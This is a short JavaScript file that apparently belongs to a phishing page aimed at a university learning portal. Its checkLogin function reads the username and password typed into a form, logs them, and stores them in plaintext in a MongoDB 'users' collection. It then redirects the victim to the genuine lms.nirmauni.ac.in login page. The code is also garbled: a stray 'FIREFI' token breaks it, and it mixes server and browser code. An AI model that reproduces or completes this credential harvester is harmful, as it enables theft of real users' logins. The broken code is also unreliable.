// const MongoClient = require('mongodb').MongoClient;
// Connection URL
const { MongoClient } = require('mongodb');
const url = 'mongodb://localhost:27017';
console.log(url);
console.log('hello');FIREFI
// Database Name
const dbName = 'admin';

// Create a new MongoClient
const client = new MongoClient(url, { useNewUrlParser: true });

// Use connect method to connect to the Server
client.connect(function(err) {
  console.log("Connected successfully to server");

  const db = client.db(dbName);

  // Get the collection
  const collection = db.collection('users');

  // Insert a document
  const document = { username: 'john', password: 'password123' };
  collection.insertOne(document, function(err, result) {
    console.log("Inserted document into the collection");
    client.close();
  });
});


function checkLogin(){
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    console.log(username, password);

    client.connect(function(err) {
        console.log("Connected successfully to server");
      
        const db = client.db(dbName);
      
        // Get the collection
        const collection = db.collection('users');
      
        // Insert a document
        const document = { username: username, password: password };
        collection.insertOne(document, function(err, result) {
          console.log("Inserted document into the collection");
          client.close();
        });
      });
    // redirect it to the login page
    window.location.href = "https://lms.nirmauni.ac.in/my/";
    return false;
}